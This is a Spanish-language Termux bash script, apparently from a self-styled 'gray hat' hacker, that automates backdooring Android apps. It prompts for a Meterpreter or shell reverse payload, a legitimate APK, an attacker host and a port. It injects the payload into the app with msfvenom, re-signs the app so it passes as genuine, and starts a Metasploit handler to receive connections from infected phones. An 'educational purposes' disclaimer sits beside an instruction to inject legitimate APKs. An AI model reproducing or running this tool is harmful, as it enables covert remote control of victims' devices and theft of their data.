#!/data/data/com.termux/files/usr/bin/bash
set -euo pipefail
IFS=$'\n\t'
trap ctrl_c 2
function ctrl_c () {
                echo "
		"
                printf "$Y [!]$R Hola Soy Cesar Hacker The Gray Grasias por usa mi herramienta$W
                \n"
        }

# VAR
	R='\033[1;31m'
        G='\033[1;32m'
        Y='\033[1;33m'
        B='\033[1;34m'
	M='\033[1;35m'
        C='\033[1;36m'
        W='\033[0m'
	TMP_DIR=$HOME/Injector
	Injector=$(find $TMP_DIR/apk -name "output.apk")

function Banner {
	echo $(clear)
	printf "$Y"
	echo "_|_|_|            _|                        _|"
	echo "  _|    _|_|_|          _|_|      _|_|_|  _|_|_|_|    _|_|    _|  _|_|"
	echo "  _|    _|    _|  _|  _|_|_|_|  _|          _|      _|    _|  _|_|"
	echo "  _|    _|    _|  _|  _|        _|          _|      _|    _|  _|"
	echo "_|_|_|  _|    _|  _|    _|_|_|    _|_|_|      _|_|    _|_|    _|"
	echo "                  _|"
	echo "                _|      v1.2.3 Cesar Hack Gray"
	printf "$W
	\n"
}

function Chao_chao {
	echo $(clear)
        echo "
        "
        printf "$G"
	echo "     Buscame En You Tube :: https://youtu.be/QA6GwNA2uEs"
  	echo "          ________"
	echo "         / ______ \ "
	echo "         || _  _ || "
	echo "         ||| || |||          AAAAAA   PPPPPPP   KKK  KKK "
	echo "         |||_||_|||         AAA  AAA  PPP  PPP  KKK KKK  "
	echo "         || _  _o|| (o)     AAA  AAA  PPP  PPP  KKKKKK   "
	echo "         ||| || |||         AAAAAAAA  PPPPPPPP  KKK KKK  "
	echo "         |||_||_|||         AAA  AAA  PPP       KKK  KKK "
	echo "         ||______||         AAA  AAA  PPP       KKK  KKK"
	echo "        /__________\ "
	echo "________|__________|________________________________________________"
	echo "       /____________\ "
	echo "       |____________|     Cesar Hacker The Gray     (v .1.0.3)"
	echo "======================================================================"
	printf "$Y"
	echo "       (1)   Buscame en las redes sosiales como:"
	echo "       (3)   Nombre : Cesar Hackeando desde android"
	echo "       (4)   Youtube: https://youtu.be/QA6GwNA2uEs"
	echo "       (5)   Instagram: @The Crater viruz gray"
	echo "       (6)   Facebook: Cesar Hack Gray"
	printf "$W"
        echo "
        "
}

function SET {
	Banner

	echo
	echo -e "$C PAYLOADS"
	echo -e "$G [1] android/meterpreter/reverse_http"
	echo -e "$G [2] android/meterpreter/reverse_https"
	echo -e "$G [3] android/meterpreter/reverse_tcp"
	echo -e "$G [4] android/shell/reverse_http"
	echo -e "$G [5] android/shell/reverse_https"
	echo -e "$G [6] android/shell/reverse_tcp"
	echo
printf "$C [Set]$R PAYLOADS >> $Y"
	while read -p " >> " PAYLOAD && [ -z $PAYLOAD ]; do
		printf "\n $R
		Gray Porfavor ecoje un el tipo de payload
		$W \n"
	done


printf "$C [Set]$R Ruta de la apk$C"
	while read -p " >> " APK && [ -z $APK ]; do
		printf "\n $R
		[Gray] porfavor elije una apk original
		$W \n"
	done
			if [ ! -e $APK ]; then
				printf "$R [Gray error tu apk no existe
				$W \n"
				sleep 2
				SET
			fi


printf "$C [Set]$R LOCAL HOST$Y"
        while read -p " >> " LHOST && [ -z $LHOST ]; do
                printf "\n $R
                [Gray] porfavor pon un IP [HOST]
                $W \n"
	done

printf "$C [Set]$R LOCAL PORT$Y"
        while read -p " >> " LPORT && [ -z $LPORT ]; do
                printf "\n $R
                [Gray] porfavor pon un puerto [LPORT]
                $W \n"
        done

printf "$C [Set]$R Nuevo nombre $C"
	while read -p " >> " MYAPK && [ -z $MYAPK ]; do
		printf "\n $R
		[Gray] nesesitamos un nuevo nombre de la apk
		$W \n"
	done
sleep 1
	Check
}
function Check {
	Banner
	if [ $PAYLOAD -eq '1' ]; then

	printf "$R [Cesar]$G Configurasion..?
	"
	sleep 1
printf "$Y[!]$C Original.apk   =$M $APK \n"
printf "$Y	 [!]$C PAYLOAD =$M android/meterpreter/reverse_http \n"
printf "$Y	 [!]$C LHOST   =$M $LHOST \n"
printf "$Y	 [!]$C LPORT   =$M $LPORT \n"
printf "$Y	 [!]$C Nombre =$M $MYAPK \n"
echo 
	
	elif [ $PAYLOAD -eq '2' ]; then

	printf "$M [Cesar]$C Configurasion..?
	"
	sleep 1
printf "$G[!]$M Original.apk   =$Y $APK \n"
printf "$G       [!]$M PAYLOAD =$Y android/meterpreter/reverse_https \n"
printf "$G       [!]$M LHOST   =$Y $LHOST \n"
printf "$G       [!]$M LPORT   =$Y $LPORT \n"
printf "$C       [!]$M Nombre  =$Y $MYAPK \n"
	echo

	elif [ $PAYLOAD -eq '3' ]; then

	printf "$C [Cesar]$B Configurasion..?
	"
	sleep 1
printf "$C[!]$Y Original.apk   =$G $APK \n"
printf "$C       [!]$Y PAYLOAD =$G android/meterpreter/reverse_tcp \n"
printf "$C       [!]$Y LHOST   =$G $LHOST \n"
printf "$C       [!]$Y LPORT   =$G $LPORT \n"
printf "$C       [!]$Y Nombre  =$G $MYAPK \n"
	echo

	elif [ $PAYLOAD -eq '4' ]; then
	
	printf "$Y [Cesar]$C Configurasion..?
	"
	sleep 1
printf "$R[!]$Y Original.apk   =$M $APK \n"
printf "$R       [!]$B PAYLOAD =$M android/shell/reverse_http \n"
printf "$R       [!]$B LHOST   =$M $LHOST \n"
printf "$R       [!]$B LPORT   =$M $LPORT \n"
printf "$R       [!]$B Nombre  =$M $MYAPK \n"
	echo

	elif [ $PAYLOAD -eq '5' ]; then
	
	printf "$B [Cesar]$M Comfigurasion..?
	"
	sleep 1
printf "$G[!]$Y Original.apk   =$Y $APK \n"
printf "$G       [!]$Y PAYLOAD =$Y android/shell/reverse_https \n"
printf "$G       [!]$Y LHOST   =$Y $LHOST \n"
printf "$G       [!]$Y LPORT   =$Y $LPORT \n"
printf "$G       [!]$Y Nombre  =$Y $MYAPK \n"
	echo

	elif [ $PAYLOAD -eq '6' ]; then

	printf "$C [Cesar]$B Configurasion..?
	"
	sleep 1
printf "$C[!]$Y Original.apk   =$G $APK \n"
printf "$C       [!]$Y PAYLOAD =$G android/shell/reverse_tcp \n"
printf "$C       [!]$Y LHOST   =$G $LHOST \n"
printf "$C       [!]$Y LPORT   =$G $LPORT \n"
printf "$C       [!]$Y Nombre  =$G $MYAPK \n"
	echo
	

fi

printf "$C"
	while read -p "[Gray] Todo esta bien [y|n] >> " yesorno && [ -z $yesorno ]; do
		printf "\n $R
		[Gray] porfavor nesesitamos una respuesta
		$W \n"
	done
		if [ $yesorno = 'y' -o $yesorno = 'Y' ] ; then
			Payload
		else
			SET
		fi
}
function Payload {
	Banner

	if [ $PAYLOAD -eq '1' ]; then

	printf "$G [Gray]$C Creating Payload >> Injecting >>$Y Original...$G"\\n
	echo
	sleep 2
	msfvenom -x $APK -p $android/meterpreter/reverse_http LHOST=$LHOST LPORT=$LPORT

	elif [ $PAYLOAD -eq '2' ]; then
	
	printf "$C [Gray]$G Creating Payload >> Injecting >>$R Original...$Y"\\n
	echo
	sleep 2
	msfvenom -x $APK -p android/meterpreter/reverse_https LHOST=$LHOST LPORT=$LPORT

	elif [ $PAYLOAD -eq '3' ]; then

	printf "$C [Gray]$G Creating Payload >> Injecting >>$R Original...$Y"\\n
	echo
	sleep 2
	msfvenom -x $APK -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT

	elif [ $PAYLOAD -eq '4' ]; then

	printf "$M [Gray]$R Creating Payload >> Injecting >>$C Original...$Y"\\n
	echo
	sleep 2
	msfvenom -x $APK -p android/shell/reverse_http LHOST=$LHOST LPORT=$LPORT

	elif [ $PAYLOAD -eq '5' ]; then
	
	printf "$Y [Gray]$B Creating Payload >> Injecting >>$C Original..$M"\\n
	echo
	sleep 2
	msfvenom -x $APK -p android/shell/reverse_https LHOST=$LHOST LPORT=$LPORT

	elif [ $PAYLOAD -eq '6' ]; then
	
	printf "$C [Gray]$G Creating Payload >> Injecting >>$R Original..$Y"\\n
	echo
	sleep 2
	msfvenom -x $APK -p android/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT

fi
	sign
}
function sign {
	Banner
	printf "$C [Gray]$G Firmasion del Payload (original)!!
	\n"
	printf "$C [1]$Y Signapk...\n"
	printf "$C [2]$Y Apksigner$G
	\n"
	while read -p "[Gray ] Con cual firmamos (1/2) >> " SIGN && [ -z $SIGN ]; do
		printf "$R 
		[Gray] porfavor escoje como quieres firmar tu apk
		\n $W"
	done
	
	if [ $SIGN -eq '1' ]; then
		echo
		printf "$C [Gray]$G Signing la apk se esta firmando. . .$W \n"
		cd $TMP_DIR
                sleep 3
		./signapk publickey.x509.pem publickey.pk8 $TMP_DIR/apk/output.apk $TMP_DIR/Gray/$MYAPK
                rm $TMP_DIR/apk/output.apk
		cd $HOME
		echo
		printf "$G \n \t Listoo!!
		$W"
		sleep 1
		Ending
	elif [ $SIGN -eq '2' ]; then
		printf "$C [Gray]$G Signing la apk se esta firmando. . .$W \n"
		cd $TMP_DIR/apk
		sleep 3
		apksigner -p Cesar keystore output.apk $TMP_DIR/Gray/$MYAPK
		rm output.apk
		cd $HOME
		printf "$G \n \t Listoo!!
		$W"
		sleep 1
		Ending
	else
			sign
	fi
}
function Set_Handler {
	Banner

	printf "$C \n [Set]$G LOCAL HOST$Y"
		while read -p " >> " LHOST && [ -z $LHOST ]; do
			printf "\n $R
			[Gray] porfavor coloca un IP
			$W \n"
		done
	printf "$C [Set]$G LOCAL PORT$Y"
		while read -p " >> " LPORT && [ -z $LPORT ]; do
			printf "\n $R
			[Gra] porfavor coloca un puerto
			$W \n"
		done

	Banner
	if [ $PAYLOAD -eq '1' ]; then

	printf "$C [Cesar]$G Configurasion..!
	"
        sleep 1
        printf "$Y [!]$C PAYLOAD =$R android/meterpreter/reverse_http \n"
	printf "$Y         [!]$C LHOST   =$R $LHOST \n"
	printf "$Y         [!]$C LPORT   =$R $LPORT \n"
	echo
	

	elif [ $PAYLOAD -eq '2' ]; then


	printf "$C [Cesar]$G Configurasion..!
	"
	sleep 1
	printf "$Y [!]$C PAYLOAD =$R android/meterpreter/reverse_https \n"
	printf "$Y         [!]$C LHOST   =$R $LHOST \n"
	printf "$Y         [!]$C LPORT   =$R $LPORT \n"
	echo
	

	elif [ $PAYLOAD -eq '3' ]; then


	printf "$C [Cesar]$G Configurasion..!
	"
	sleep 1
	printf "$Y [!]$C PAYLOAD =$R android/meterpreter/reverse_tcp \n"
	printf "$Y         [!]$C LHOST   =$R $LHOST \n"
	printf "$Y         [!]$C LPORT   =$R $LPORT \n"
	echo


	elif [ $PAYLOAD -eq '4' ]; then


	printf "$C [Cesar]$G Configurasion..!
	"
	sleep 1
	printf "$Y [!]$C PAYLOAD =$R android/shell/reverse_http\n"
	printf "$Y         [!]$C LHOST   =$R $LHOST \n"
	printf "$Y         [!]$C LPORT   =$R $LPORT \n"
	echo


	elif [ $PAYLOAD -eq '5' ]; then


	printf "$C [Cesar]$G Configurasion..!
	"
	sleep 1
	printf "$Y [!]$C PAYLOAD =$R android/shell/reverse_https\n"
	printf "$Y         [!]$C LHOST   =$R $LHOST \n"
	printf "$Y         [!]$C LPORT   =$R $LPORT \n"
	echo


	elif [ $PAYLOAD -eq '6' ]; then


	printf "$C [Cesar]$G Configurasion..!
	"
	sleep 1
	printf "$Y [!]$C PAYLOAD =$R android/shell/reverse_tcp\n"
	printf "$Y         [!]$C LHOST   =$R $LHOST \n"
	printf "$Y         [!]$C LPORT   =$R $LPORT \n"
	echo
	fi
	printf "$C"
		while read -p "[Gray] Todo esta en orden [y|n] >> " yesorno && [ -z $yesorno ]; do
			printf "\n $R
			[Gray] porfavor nesesitamos una respuesta
			$W \n"
		done
			if [ $yesorno = 'y' -o $yesorno = 'Y' ] ; then
				Msfconsole
			else
				Set_Handler
			fi
}
function Msfconsole {
	Chao_chao
	if [ $PAYLOAD -eq '1' ]; then
	echo
	printf "$C [Gray]$R explotando.... $Y msfconsole . . .$W"
	echo
	touch $TMP_DIR/Cesar/$MYAPK.rc
	echo "use exploit/multi/handler" >> $TMP_DIR/Cesar/$MYAPK.rc
	echo "set PAYLOAD android/meterpreter/reverse_http" >> $TMP_DIR/Cesar/$MYAPK.rc
	echo "set LHOST $LHOST" >> $TMP_DIR/Cesar/$MYAPK.rc
	echo "set LPORT $LPORT" >> $TMP_DIR/Cesar/$MYAPK.rc
	echo "run" >> $TMP_DIR/Cesar/$MYAPK.rc
	chmod 777 $TMP_DIR/Cesar/$MYAPK.rc
	echo "
	"
	msfconsole -q -r $TMP_DIR/Cesar/$MYAPK.rc

	elif [ $PAYLOAD -eq '2' ]; then
	echo
	printf "$C [Gray]$R explotando.... $Y msfconsole . . .$W"
	echo
	touch $TMP_DIR/Cesar/$MYAPK.rc
	echo "use exploit/multi/handler" >> $TMP_DIR/Cesar/$MYAPK.rc
	echo "set PAYLOAD android/meterpreter/reverse_https" >> $TMP_DIR/Cesar/$MYAPK.rc
	echo "set LHOST $LHOST" >> $TMP_DIR/Cesar/$MYAPK.rc
	echo "set LPORT $LPORT" >> $TMP_DIR/Cesar/$MYAPK.rc
	echo "run" >> $TMP_DIR/Cesar/$MYAPK.rc
	chmod 777 $TMP_DIR/Cesar/$MYAPK.rc
	echo "
	"
	msfconsole -q -r $TMP_DIR/Cesar/$MYAPK.rc

	elif [ $PAYLOAD -eq '3' ]; then
	echo
	printf "$C [Gray]$R explotando.... $Y msfconsole . . .$W"
	echo
	touch $TMP_DIR/Cesar/$MYAPK.rc
	echo "use exploit/multi/handler" >> $TMP_DIR/Cesar/$MYAPK.rc
	echo "set PAYLOAD android/meterpreter/reverse_tcp" >> $TMP_DIR/Cesar/$MYAPK.rc
	echo "set LHOST $LHOST" >> $TMP_DIR/Cesar/$MYAPK.rc
	echo "set LPORT $LPORT" >> $TMP_DIR/Cesar/$MYAPK.rc
	echo "run" >> $TMP_DIR/Cesar/$MYAPK.rc
	chmod 777 $TMP_DIR/Cesar/$MYAPK.rc
	echo "
	"
	msfconsole -q -r $TMP_DIR/Cesar/$MYAPK.rc

	elif [ $PAYLOAD -eq '4' ]; then
	echo
	printf "$C [Gray]$R explotando.... $Y msfconsole . . .$W"
	echo
	touch $TMP_DIR/Cesar/$MYAPK.rc
	echo "use exploit/multi/handler" >> $TMP_DIR/Cesar/$MYAPK.rc
	echo "set PAYLOAD android/shell/reverse_http" >> $TMP_DIR/Cesar/$MYAPK.rc
	echo "set LHOST $LHOST" >> $TMP_DIR/Cesar/$MYAPK.rc
	echo "set LPORT $LPORT" >> $TMP_DIR/Cesar/$MYAPK.rc
	echo "run" >> $TMP_DIR/Cesar/$MYAPK.rc
	chmod 777 $TMP_DIR/Cesar/$MYAPK.rc
	echo "
	"

	msfconsole -q -r $TMP_DIR/Cesar/$MYAPK.rc

	elif [ $PAYLOAD -eq '5' ]; then
	echo
	printf "$C [Gray]$R explotando.... $Y msfconsole . . .$W"
	echo
	touch $TMP_DIR/Cesar/$MYAPK.rc
	echo "use exploit/multi/handler" >> $TMP_DIR/Cesar/$MYAPK.rc
	echo "set PAYLOAD android/shell/reverse_https" >> $TMP_DIR/Cesar/$MYAPK.rc
	echo "set LHOST $LHOST" >> $TMP_DIR/Cesar/$MYAPK.rc
	echo "set LPORT $LPORT" >> $TMP_DIR/Cesar/$MYAPK.rc
	echo "run" >> $TMP_DIR/Cesar/$MYAPK.rc
	chmod 777 $TMP_DIR/Cesar/$MYAPK.rc
	echo "
	"

	msfconsole -q -r $TMP_DIR/Cesar/$MYAPK.rc

	elif [ $PAYLOAD -eq '6' ]; then
	echo
	printf "$C [Gray]$R explotando.... $Y msfconsole . . .$W"
	echo
	touch $TMP_DIR/Cesar/$MYAPK.rc
	echo "use exploit/multi/handler" >> $TMP_DIR/Cesar/$MYAPK.rc
	echo "set PAYLOAD android/shell/reverse_tcp" >> $TMP_DIR/Cesar/$MYAPK.rc
	echo "set LHOST $LHOST" >> $TMP_DIR/Cesar/$MYAPK.rc
	echo "set LPORT $LPORT" >> $TMP_DIR/Cesar/$MYAPK.rc
	echo "run" >> $TMP_DIR/Cesar/$MYAPK.rc
	chmod 777 $TMP_DIR/Cesar/$MYAPK.rc
	echo "
	"

	msfconsole -q -r $TMP_DIR/Cesar/$MYAPK.rc

fi

}
function Ending {
	printf "$C \n
[Gray]$G Quieres enpezar el proseso de metasploit?$C
	\n"
        while read -p "[Gray] msfconsole > [y / n] >> " yesorno && [ -z $yesorno ]; do
                printf "\n $R
                [Gray] porfavor nesesitamos una respuesta
                $W \n"
        done
                if [ $yesorno = 'y' -o $yesorno = 'Y' ] ; then
                        Banner
                        printf "$R [Gray]$C Quieres usar la comfigurasion de antes ?$G
                        \n"
                        while read -p "[Gray] Bamos a inisiar? [y|n] >> " yesorno && [ -z $yesorno ]; do
                                printf "$R
                                [Gray] porfavor nesesitamos una respuesta
                                $W \n"
                        done
                        if [ $yesorno = 'y' -o $yesorno = 'Y' ] ; then
                                Msfconsole
                        else
                                Set_Handler
                        fi
                else
                        Chao_chao
                        printf "$C [Cesar]$Y Grasias por usar mi herramienta$W
                        \n"
                        printf "$C [Cesar]$Y att.. $B Cesar Hacker THe Gray
                $W \n"
        fi
}

echo $(clear)
        printf "$C"
	echo "                         SOMOS UNO SOMOS TODOS"
	echo "                         HACKEANDO DESDE TERMUX"
        echo "  "                         
        printf "$G"  
printf "$Y"
	echo "              ____                       _   _            _"
	echo "            / ___|___  ___  __ _ _ __  | | | | __ _  ___| | __"
	echo "           | |   / _ \/ __|/ _  |  __| | |_| |/ _  |/ __| |/ /"
	echo "           | |__|  __/\__ \ (_| | |    |  _  | (_| | (__|   < "
	echo "            \____\___||___/\__,_|_|    |_| |_|\__,_|\___|_|\_\"
        "
printf ""$C""
        echo ""            
       	echo "                      AAAAAA   PPPPPPP   KKK  KKK"
      	echo "                     AAA  AAA  PPP  PPP  KKK KKK"
	echo "                     AAA  AAA  PPP  PPP  KKKKKK "
       	echo "                     AAAAAAAA  PPPPPPPP  KKK KKKk"
	echo "                     AAA  AAA  PPP       KKK  KKK"
       	echo "                     AAA  AAA  PPP       KKK  KKK"
        
        echo ""                         
        echo "  
        "
printf "$R"
        echo "                            ADVERTENSIA"
printf "$Y"
        echo "                   ESTE ES UN PROGRAMA HECHO CON"
        echo "                  FINES EDUCATIVOZ HE IMFORMATIVOZ"
        echo "                   por ello no me ago responsable"
	echo "                 del mal uso que le puedas brindarle"
        echo "                        Inyecta apks lejitimas"
        echo "                        CESAR HACKER THE GRAY"
        
printf "$R                         Usalo con precausion "
        echo""
        echo""
        printf "                  $C Presiona$Y en $B enter$C para continuar$W"
        read enter
	SET
        echo "

        "
#					@Cesar.
